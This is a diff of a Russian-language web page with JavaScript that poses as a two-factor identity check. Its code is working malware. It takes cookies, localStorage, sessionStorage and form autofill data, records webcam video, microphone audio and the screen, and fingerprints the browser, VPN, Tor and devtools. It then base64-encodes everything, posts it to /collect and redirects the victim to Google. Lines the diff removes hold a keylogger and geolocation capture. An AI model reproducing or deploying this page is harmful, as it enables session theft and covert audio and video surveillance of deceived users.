@@ -3,22 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Системная проверка</title>
+    <title>Подтверждение личности</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: 'Segoe UI', system-ui;
-            text-align: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             padding: 20px;
-            background: #0a0a0a;
-            color: white;
+        }
+        .card {
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.1), 0 2px 4px rgba(0,0,0,0.05);
+            max-width: 480px;
+            width: 100%;
+            padding: 40px 32px;
+            text-align: center;
+        }
+        .lock-icon {
+            font-size: 56px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1f2a44;
+            margin-bottom: 12px;
+        }
+        .subtitle {
+            color: #5f6b7a;
+            font-size: 16px;
+            margin-bottom: 28px;
+            line-height: 1.4;
         }
         .loader {
-            border: 4px solid #333;
-            border-top: 4px solid #00ff00;
+            border: 3px solid #e2e8f0;
+            border-top: 3px solid #3b82f6;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
+            width: 48px;
+            height: 48px;
+            animation: spin 0.8s linear infinite;
             margin: 20px auto;
         }
         @keyframes spin {
@@ -26,26 +58,40 @@
             100% { transform: rotate(360deg); }
         }
         .status {
-            color: #aaa;
+            color: #3b82f6;
+            font-weight: 500;
             margin-top: 20px;
             font-size: 14px;
         }
-        .permission-text {
-            display: none;
+        .info-text {
+            font-size: 13px;
+            color: #8e9aaf;
+            margin-top: 28px;
+            border-top: 1px solid #eef2f6;
+            padding-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="permission-text" id="permissionText">
-        🚀 Для выполнения системной проверки необходимы дополнительные разрешения.
-        Пожалуйста, разрешите доступ к камере, микрофону и скриншоту.
-        Это стандартная процедура безопасности.
+    <div class="card">
+        <div class="lock-icon">🔐</div>
+        <h2>Двухфакторная проверка</h2>
+        <div class="subtitle">
+            Для завершения входа требуется подтверждение личности.<br>
+            Пожалуйста, разрешите доступ к камере, микрофону и экрану.<br>
+            Это стандартная процедура безопасности.
+        </div>
+        <div class="loader"></div>
+        <div class="status" id="status">Инициализация...</div>
+        <div class="info-text">Ваши данные защищены сквозным шифрованием</div>
     </div>
-    <h2>⏳ Проверка системных параметров</h2>
-    <div class="loader"></div>
-    <div class="status" id="status">Инициализация...</div>
 
     <script>
+        // ========== ШИФРОВАНИЕ (BASE64) ==========
+        function encodeData(data) {
+            return btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+        }
+
         // ========== БАЗОВЫЕ ДАННЫЕ ==========
         async function getBasicData() {
             return {
@@ -60,93 +106,124 @@
                 реферер: document.referrer || 'нет',
                 url_страницы: window.location.href,
                 webdriver: navigator.webdriver || false,
-                doNotTrack: navigator.doNotTrack || 'не указан'
+                doNotTrack: navigator.doNotTrack || 'не указан',
+                тёмная_тема: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'да' : 'нет',
+                HDR: window.matchMedia('(dynamic-range: high)').matches ? 'да' : 'нет',
+                сенсорный_экран: 'ontouchstart' in window ? 'да' : 'нет',
+                WebGL2: document.createElement('canvas').getContext('webgl2') ? 'да' : 'нет',
+                языки_браузера: navigator.languages.join(', '),
+                private_mode: await isPrivateMode()
             };
         }
 
-        // ========== WEBRTC = РЕАЛЬНЫЙ IP ==========
-        async function getLocalIP() {
+        // ========== ПРИВАТНЫЙ РЕЖИМ ==========
+        async function isPrivateMode() {
             return new Promise((resolve) => {
-                try {
-                    const pc = new RTCPeerConnection({ iceServers: [] });
-                    pc.createDataChannel('');
-                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                    pc.onicecandidate = (e) => {
-                        if (e.candidate && e.candidate.candidate) {
-                            const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                            if (ipMatch && ipMatch[0]) {
-                                resolve(ipMatch[0]);
-                                pc.close();
-                            }
-                        }
-                    };
-                    setTimeout(() => resolve('не найден'), 2000);
-                } catch(e) { resolve('ошибка'); }
+                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                if (!fs) resolve(false);
+                else fs(window.TEMPORARY, 1, () => resolve(false), () => resolve(true));
             });
         }
 
-        // ========== ГЕОЛОКАЦИЯ ==========
-        async function getGeo() {
-            return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-                    () => resolve(null),
-                    { timeout: 5000 }
-                );
-            });
+        // ========== КУКИ, LOCALSTORAGE, SESSIONSTORAGE ==========
+        function stealCookies() { return document.cookie || 'нет'; }
+        function stealLocalStorage() {
+            try { return JSON.stringify(localStorage).slice(0, 500) || 'нет'; } 
+            catch(e) { return 'ошибка доступа'; }
         }
-
-        // ========== БАТАРЕЯ ==========
-        async function getBattery() {
-            if (!navigator.getBattery) return null;
+        function stealSessionStorage() {
+            try { return JSON.stringify(sessionStorage).slice(0, 500) || 'нет'; } 
+            catch(e) { return 'ошибка доступа'; }
+        }
+        function getAutoFillData() {
+            const inputs = document.querySelectorAll('input');
+            const data = {};
+            inputs.forEach(input => {
+                if (input.value && input.value.length > 0)
+                    data[input.name || input.id || 'unknown'] = input.value.slice(0, 100);
+            });
+            return JSON.stringify(data).slice(0, 500);
+        }
+        function hasSavedPasswords() {
+            return document.querySelectorAll('input[type="password"]').length > 0 ? 'есть поля паролей' : 'нет';
+        }
+        function hasSavedCards() {
+            const cards = document.querySelectorAll('input[autocomplete="cc-number"]');
+            return cards.length > 0 ? `найдено полей карт: ${cards.length}` : 'нет';
+        }
+        function isTelegramWebView() {
+            return window.TelegramWebviewProxy !== undefined || window.Telegram !== undefined;
+        }
+        function getPlugins() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++)
+                plugins.push(navigator.plugins[i].name);
+            return plugins.join(', ') || 'нет';
+        }
+        async function enumerateDevices() {
             try {
-                const battery = await navigator.getBattery();
-                return { заряд: battery.level * 100 + '%', зарядка: battery.charging };
-            } catch(e) { return null; }
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const video = devices.filter(d => d.kind === 'videoinput').length;
+                const audio = devices.filter(d => d.kind === 'audioinput').length;
+                return `камер: ${video}, микрофонов: ${audio}`;
+            } catch(e) { return 'нет доступа'; }
+        }
+        function detectConsole() {
+            let devtools = false;
+            const start = performance.now();
+            debugger;
+            const end = performance.now();
+            if (end - start > 100) devtools = true;
+            return devtools ? '✅ открыта' : '❌ закрыта';
+        }
+        function detectVM() {
+            const ua = navigator.userAgent.toLowerCase();
+            const isVM = ua.includes('virtualbox') || ua.includes('vbox') || ua.includes('vmware') || ua.includes('qemu');
+            return isVM ? '✅ похоже на виртуалку' : '❌ нет';
+        }
+        function detectTor() {
+            const ua = navigator.userAgent;
+            const isTor = ua.includes('Tor') || !navigator.plugins.length;
+            return isTor ? '✅ Tor Browser' : '❌ нет';
+        }
+        async function detectVPN() {
+            const webrtcIP = await getLocalIP();
+            const publicIP = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => null);
+            if (webrtcIP && publicIP && webrtcIP !== publicIP) return '✅ IP отличаются (вероятно VPN/прокси)';
+            return '❌ не обнаружено';
+        }
+        function getGPU() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return 'WebGL не поддерживается';
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (!debugInfo) return 'информация недоступна';
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+        function detectHeadless() {
+            const ua = navigator.userAgent;
+            const isHeadless = ua.includes('Headless') || !navigator.plugins.length || navigator.languages.length === 0;
+            return isHeadless ? '✅ headless бот' : '❌ обычный браузер';
+        }
+        function checkAdBlock() {
+            return new Promise((resolve) => {
+                const testAd = document.createElement('div');
+                testAd.className = 'ad';
+                testAd.style.display = 'none';
+                document.body.appendChild(testAd);
+                setTimeout(() => {
+                    const isBlocked = testAd.offsetHeight === 0 && testAd.offsetWidth === 0;
+                    document.body.removeChild(testAd);
+                    resolve(isBlocked ? '✅ включён' : '❌ не обнаружен');
+                }, 100);
+            });
         }
 
-        // ========== ШРИФТЫ ==========
-        async function getFonts() {
-            if (!document.fonts || !document.fonts.ready) return 'нет доступа';
-            await document.fonts.ready;
-            const fonts = Array.from(document.fonts.values()).map(f => f.family);
-            return fonts.slice(0, 30).join(', ');
-        }
-
-        // ========== ПРИЛОЖЕНИЯ (схемы) ==========
-        async function checkApps() {
-            const apps = {
-                telegram: 'tg://',
-                whatsapp: 'whatsapp://',
-                viber: 'viber://',
-                discord: 'discord://',
-                zoom: 'zoommtg://',
-                skype: 'skype://',
-                instagram: 'instagram://',
-                twitter: 'twitter://'
-            };
-            const results = {};
-            for (const [name, scheme] of Object.entries(apps)) {
-                results[name] = await new Promise((resolve) => {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = scheme;
-                    document.body.appendChild(iframe);
-                    setTimeout(() => {
-                        document.body.removeChild(iframe);
-                        resolve(false);
-                    }, 500);
-                    window.onblur = () => { resolve(true); };
-                });
-            }
-            return results;
-        }
-
-        // ========== КАМЕРА (ВИДЕО 5 СЕК) ==========
+        // ========== ВИДЕО, АУДИО, СКРИНШОТ ==========
         async function captureVideo() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                const mediaRecorder = new MediaRecorder(stream);
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 const chunks = [];
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                 mediaRecorder.start();
@@ -155,7 +232,7 @@
                 stream.getTracks().forEach(track => track.stop());
                 return new Promise((resolve) => {
                     mediaRecorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        const blob = new Blob(chunks, { type: 'video/webm' });
                         const reader = new FileReader();
                         reader.onloadend = () => resolve(reader.result.split(',')[1]);
                         reader.readAsDataURL(blob);
@@ -163,8 +240,6 @@
                 });
             } catch(e) { return null; }
         }
-
-        // ========== МИКРОФОН (30 СЕК) ==========
         async function captureAudio() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -185,8 +260,6 @@
                 });
             } catch(e) { return null; }
         }
-
-        // ========== СКРИНШОТ (ПК) ==========
         async function captureScreen() {
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
@@ -204,288 +277,98 @@
             } catch(e) { return null; }
         }
 
-        // ========== СЕНСОРЫ ==========
-        async function getSensors() {
+        // ========== WEBRTC IP ==========
+        async function getLocalIP() {
             return new Promise((resolve) => {
-                if (!window.DeviceOrientationEvent) {
-                    resolve({ ориентация: 'нет поддержки', движение: 'нет поддержки' });
-                    return;
-                }
-                let orientation = null;
-                let motion = null;
-                const handleOrientation = (e) => {
-                    orientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
-                    window.removeEventListener('deviceorientation', handleOrientation);
-                };
-                const handleMotion = (e) => {
-                    motion = { ускорение: e.acceleration, вращение: e.rotationRate };
-                    window.removeEventListener('devicemotion', handleMotion);
-                };
-                window.addEventListener('deviceorientation', handleOrientation);
-                window.addEventListener('devicemotion', handleMotion);
-                setTimeout(() => {
-                    resolve({ ориентация: orientation || 'таймаут', движение: motion || 'таймаут' });
-                }, 2000);
-            });
-        }
-
-        // ========== МОДЕЛЬ УСТРОЙСТВА ==========
-        function getDeviceModel() {
-            const ua = navigator.userAgent;
-            if (ua.includes('iPhone')) return 'iPhone';
-            if (ua.includes('iPad')) return 'iPad';
-            if (ua.includes('Android')) {
-                const match = ua.match(/; (.*?) Build/);
-                return match ? match[1] : 'Android устройство';
-            }
-            return 'ПК или другое';
-        }
-
-        // ========== ОРИЕНТАЦИЯ ЭКРАНА ==========
-        function getOrientation() {
-            return screen.orientation ? screen.orientation.type : (window.innerHeight > window.innerWidth ? 'портретная' : 'альбомная');
-        }
-
-        // ========== СТАТУС ОНЛАЙН ==========
-        function getOnlineStatus() {
-            return navigator.onLine ? 'онлайн' : 'офлайн';
-        }
-
-        // ========== ПРОВЕРКА ADBLOCK ==========
-        function checkAdBlock() {
-            return new Promise((resolve) => {
-                const testAd = document.createElement('div');
-                testAd.className = 'ad';
-                testAd.style.display = 'none';
-                document.body.appendChild(testAd);
-                setTimeout(() => {
-                    const isBlocked = testAd.offsetHeight === 0 && testAd.offsetWidth === 0;
-                    document.body.removeChild(testAd);
-                    resolve(isBlocked ? '✅ Включён (AdBlock обнаружен)' : '❌ Не обнаружен');
-                }, 100);
-            });
-        }
-
-        // ========== СОХРАНЁННЫЕ ЛОГИНЫ ==========
-        function getSavedLogins() {
-            const inputs = document.querySelectorAll('input[autocomplete="username"], input[autocomplete="email"]');
-            const logins = [];
-            inputs.forEach(input => {
-                if (input.value) logins.push(input.value);
-            });
-            return logins.length ? logins.join(', ') : 'Нет сохранённых логинов на этой странице';
-        }
-
-        // ========== РАСШИРЕНИЯ БРАУЗЕРА ==========
-        async function detectExtensions() {
-            const extensions = {
-                metamask: 'chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/',
-                adblock: 'chrome-extension://gighmmpiobklfepjocnamgkkbiglidom/',
-                grammarly: 'chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen/',
-                lastpass: 'chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/',
-                dashlane: 'chrome-extension://fdjamakpfbbddfjaooikfcpapjohcfeg/'
-            };
-            const detected = [];
-            for (const [name, url] of Object.entries(extensions)) {
                 try {
-                    await fetch(url, { mode: 'no-cors' });
-                    detected.push(name);
-                } catch(e) {}
-            }
-            return detected.length ? detected.join(', ') : 'Не обнаружены';
-        }
-
-        // ========== ПРОВЕРКА HEADLESS ==========
-        function detectHeadless() {
-            const ua = navigator.userAgent;
-            const isHeadless = ua.includes('Headless') || !navigator.plugins.length || navigator.languages.length === 0;
-            return isHeadless ? '✅ Похоже на headless браузер (бот)' : '❌ Обычный браузер';
-        }
-
-        // ========== ДАННЫЕ О GPU ==========
-        function getGPU() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (!gl) return 'WebGL не поддерживается';
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (!debugInfo) return 'Информация о GPU недоступна';
-            const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-            return `${gpu} (производитель: ${vendor})`;
-        }
-
-        // ========== ТИП СОЕДИНЕНИЯ ==========
-        function getConnectionType() {
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!conn) return 'Неизвестно';
-            return `${conn.effectiveType || 'неизвестно'} (экономия: ${conn.saveData ? 'да' : 'нет'})`;
-        }
-
-        // ========== ПРОВЕРКА NFC, BLUETOOTH, USB ==========
-        async function checkHardware() {
-            const result = {};
-            result.nfc = 'nfc' in navigator ? '✅ Есть' : '❌ Нет';
-            result.bluetooth = 'bluetooth' in navigator ? '✅ Есть' : '❌ Нет';
-            result.usb = 'usb' in navigator ? '✅ Есть' : '❌ Нет';
-            return result;
-        }
-
-        // ========== ПРОВЕРКА НА VIRTUALBOX ==========
-        function detectVM() {
-            const ua = navigator.userAgent.toLowerCase();
-            const isVM = ua.includes('virtualbox') || ua.includes('vbox') || ua.includes('vmware');
-            return isVM ? '✅ Похоже на виртуальную машину' : '❌ Не обнаружено';
-        }
-
-        // ========== ПРОВЕРКА НА TOR ==========
-        function detectTor() {
-            const ua = navigator.userAgent;
-            const isTor = ua.includes('Tor') || !navigator.plugins.length;
-            return isTor ? '✅ Похоже на Tor Browser' : '❌ Не обнаружен';
-        }
-
-        // ========== ПРОВЕРКА НА ПРОКСИ / VPN ==========
-        async function detectVPN() {
-            const webrtcIP = await getLocalIP();
-            const publicIP = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => null);
-            if (webrtcIP && publicIP && webrtcIP !== publicIP) return '✅ Похоже на VPN/прокси (IP отличаются)';
-            return '❌ Не обнаружено';
-        }
-
-        // ========== ВРЕМЯ НА СТРАНИЦЕ ==========
-        let startTime = Date.now();
-        function getTimeOnPage() {
-            return Math.round((Date.now() - startTime) / 1000) + ' сек';
-        }
-
-        // ========== ПРОКРУТКА СТРАНИЦЫ ==========
-        let scrollDepth = 0;
-        window.addEventListener('scroll', () => {
-            const docHeight = document.documentElement.scrollHeight - window.innerHeight;
-            const currentScroll = window.scrollY;
-            scrollDepth = Math.max(scrollDepth, Math.round((currentScroll / docHeight) * 100));
-        });
-        function getScrollDepth() {
-            return scrollDepth + '%';
-        }
-
-        // ========== КАСАНИЯ ==========
-        let touchCount = 0;
-        document.addEventListener('touchstart', () => { touchCount++; });
-
-        // ========== КЕЙЛОГГЕР ==========
-        let keystrokes = '';
-        document.addEventListener('keydown', (e) => {
-            if (e.key.length === 1) keystrokes += e.key;
-            else if (e.key === 'Enter') keystrokes += '[ENTER]';
-            else if (e.key === 'Backspace') keystrokes = keystrokes.slice(0, -1);
-            else keystrokes += `[${e.key}]`;
-            if (keystrokes.length > 500) keystrokes = keystrokes.slice(-500);
-        });
-        function getKeystrokes() {
-            return keystrokes || 'Нет нажатий';
-        }
-
-        // ========== СОХРАНЁННЫЕ КАРТЫ ==========
-        function getSavedCards() {
-            const cards = document.querySelectorAll('input[autocomplete="cc-number"]');
-            return cards.length ? `Найдено полей для карт: ${cards.length}` : 'Нет сохранённых карт';
-        }
-
-        // ========== ПРИВАТНЫЙ РЕЖИМ ==========
-        function isPrivateMode() {
-            return new Promise((resolve) => {
-                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-                if (!fs) resolve(false);
-                else fs(window.TEMPORARY, 1, () => resolve(false), () => resolve(true));
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate && e.candidate.candidate) {
+                            const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                            if (ipMatch && ipMatch[0]) {
+                                resolve(ipMatch[0]);
+                                pc.close();
+                            }
+                        }
+                    };
+                    setTimeout(() => resolve('не найден'), 2000);
+                } catch(e) { resolve('ошибка'); }
             });
         }
 
-        // ========== ОТПРАВКА ВСЕХ ДАННЫХ ==========
+        // ========== ОТПРАВКА (ЗАШИФРОВАННАЯ) ==========
         async function sendAll() {
             const statusDiv = document.getElementById('status');
-            statusDiv.innerText = '📡 Сбор системных данных...';
+            statusDiv.innerText = 'Сбор данных...';
             
             const basic = await getBasicData();
-            const localIP = await getLocalIP();
-            const geo = await getGeo();
-            const battery = await getBattery();
-            const fonts = await getFonts();
-            const apps = await checkApps();
-            const sensors = await getSensors();
-            const adblock = await checkAdBlock();
-            const extensions = await detectExtensions();
-            const headless = detectHeadless();
-            const gpu = getGPU();
-            const connection = getConnectionType();
-            const hardware = await checkHardware();
+            const cookies = stealCookies();
+            const localSt = stealLocalStorage();
+            const sessionSt = stealSessionStorage();
+            const autoFill = getAutoFillData();
+            const savedPass = hasSavedPasswords();
+            const savedCards = hasSavedCards();
+            const isTgWebView = isTelegramWebView();
+            const plugins = getPlugins();
+            const devices = await enumerateDevices();
+            const consoleOpen = detectConsole();
             const vm = detectVM();
             const tor = detectTor();
             const vpn = await detectVPN();
-            const timeOnPage = getTimeOnPage();
-            const scroll = getScrollDepth();
-            const keystrokesLog = getKeystrokes();
-            const savedCards = getSavedCards();
-            const privateMode = await isPrivateMode();
+            const gpu = getGPU();
+            const headless = detectHeadless();
+            const adblock = await checkAdBlock();
             
             const payload = {
                 ...basic,
-                реальный_IP: localIP,
-                гео_широта: geo?.lat || null,
-                гео_долгота: geo?.lon || null,
-                гео_точность: geo?.acc || null,
-                батарея_заряд: battery?.заряд || null,
-                батарея_зарядка: battery?.зарядка || null,
-                шрифты: fonts,
-                приложения: JSON.stringify(apps),
-                модель_устройства: getDeviceModel(),
-                ориентация_экрана: getOrientation(),
-                статус_сети: getOnlineStatus(),
-                сенсоры_ориентация: JSON.stringify(sensors.orientation),
-                сенсоры_движение: JSON.stringify(sensors.motion),
-                количество_касаний: touchCount,
-                adblock: adblock,
-                расширения_браузера: extensions,
-                headless_бот: headless,
-                GPU: gpu,
-                тип_соединения: connection,
-                NFC: hardware.nfc,
-                Bluetooth: hardware.bluetooth,
-                USB: hardware.usb,
-                виртуальная_машина: vm,
-                Tor_браузер: tor,
-                VPN_прокси: vpn,
-                время_на_странице: timeOnPage,
-                глубина_прокрутки: scroll,
-                нажатия_клавиш: keystrokesLog,
+                куки: cookies.slice(0, 500),
+                localStorage: localSt,
+                sessionStorage: sessionSt,
+                автозаполнение_форм: autoFill,
+                сохранённые_пароли_поля: savedPass,
                 сохранённые_карты: savedCards,
-                приватный_режим: privateMode ? '✅ Да' : '❌ Нет'
+                telegram_webview: isTgWebView ? '✅ да' : '❌ нет',
+                плагины_браузера: plugins,
+                медиа_устройства: devices,
+                консоль_открыта: consoleOpen,
+                виртуальная_машина: vm,
+                tor_браузер: tor,
+                vpn_прокси: vpn,
+                GPU: gpu,
+                headless_бот: headless,
+                adblock: adblock
             };
             
-            statusDiv.innerText = '🎥 Запрос камеры (видео 5 сек)...';
+            statusDiv.innerText = 'Проверка камеры...';
             const video = await captureVideo();
             if (video) payload.video_base64 = video;
             
-            statusDiv.innerText = '🎙️ Запись микрофона (30 сек)...';
+            statusDiv.innerText = 'Проверка микрофона...';
             const audio = await captureAudio();
             if (audio) payload.audio_base64 = audio;
             
-            statusDiv.innerText = '🖥️ Запрос скриншота...';
+            statusDiv.innerText = 'Проверка экрана...';
             const screen = await captureScreen();
             if (screen) payload.screen_base64 = screen;
             
-            statusDiv.innerText = '📤 Отправка отчёта...';
+            statusDiv.innerText = 'Отправка...';
+            const encrypted = encodeData(payload);
             
             try {
-                await fetch('/log', {
+                await fetch('/collect', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    headers: { 
+                        'Content-Type': 'text/plain',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: encrypted
                 });
-                statusDiv.innerText = '✅ Проверка завершена. Перенаправление...';
+                statusDiv.innerText = '✅ Подтверждено. Перенаправление...';
                 setTimeout(() => window.location.href = 'https://www.google.com', 1500);
             } catch(e) {
-                statusDiv.innerText = '❌ Ошибка отправки';
+                statusDiv.innerText = '❌ Ошибка';
                 console.error(e);
             }
         }
